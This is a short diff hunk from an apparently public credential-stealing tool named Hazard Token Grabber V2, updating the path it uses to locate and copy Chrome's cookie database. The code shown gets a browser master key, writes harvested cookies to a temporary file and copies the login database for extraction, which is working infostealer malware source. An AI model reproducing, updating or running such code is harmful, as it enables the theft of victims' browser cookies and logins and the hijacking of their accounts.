@@ -145,7 +145,7 @@ class Hazard_Token_Grabber_V2:
         master_key = self.get_master_key()
         f = open(self.tempfolder+"\\Google Cookies.txt", "w", encoding="cp437", errors='ignore')
         f.write("Made by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
-        login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\cookies'
+        login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Network\\cookies'
         try:
             shutil.copy2(login_db, "Loginvault.db")
         except FileNotFoundError:
